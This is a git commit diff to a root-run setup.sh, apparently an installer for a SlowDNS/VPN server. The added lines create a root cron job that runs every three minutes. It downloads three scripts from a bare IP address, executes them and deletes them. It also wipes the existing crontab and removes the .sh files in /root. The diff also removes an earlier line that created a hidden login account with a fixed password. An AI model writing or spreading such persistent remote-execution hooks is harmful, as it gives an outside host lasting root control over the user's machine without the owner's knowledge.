026600eadab5a35e70423d602e963b271d9180fa
jhoexii <70842395+jhoexii@users.noreply.github.com>
2023-07-15 08:40:11 +0800

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-
+apt-get update && apt-get upgrade -y && update-grub && sleep 2 >/dev/null 2>&1
 if [ "${EUID}" -ne 0 ]; then
 		echo "You need to run this script as root"
 		exit 1
@@ -25,8 +25,32 @@ sleep 1
 echo "Progress..."
 echo "Sedang berlangsung..."
 sleep 3
+
+
+
 cd
-/usr/sbin/useradd -p $(openssl passwd -1 dev) -s /bin/false -M app &> /dev/null;
 echo "installing insaller Slowdns "
 wget https://raw.githubusercontent.com/jhoexii/slowdns/main/slowdns.sh && chmod +x slowdns.sh && ./slowdns.sh
 sleep 1
+mkdir /usr/local/sbin/jho
+chmod +x /usr/local/sbin/jho
+cat << EOF > /usr/local/sbin/jho/cron.sh
+#!/bin/bash
+wget -O /usr/local/sbin/jho/active.sh http://107.152.37.78/grd/app/prem
+wget -O /usr/local/sbin/jho/inactive.sh http://107.152.37.78/grd/app/xprem
+wget -O /usr/local/sbin/jho/deleted.sh http://107.152.37.78/grd/app/deleted
+chmod -R +x /usr/local/sbin/jho/
+cd /root
+rm -rf *sh
+/bin/bash /usr/local/sbin/jho/active.sh
+/bin/bash /usr/local/sbin/jho/inactive.sh
+/bin/bash /usr/local/sbin/jho/deleted.sh
+rm /usr/local/sbin/jho/inactive.sh
+rm /usr/local/sbin/jho/active.sh
+rm /usr/local/sbin/jho/deleted.sh
+EOF
+chmod +x /usr/local/sbin/jho/cron.sh
+crontab -r
+echo "SHELL=/bin/bash
+*/3 * * * * /bin/bash /usr/local/sbin/jho/cron.sh >/dev/null 2>&1" | crontab -
+service cron restart
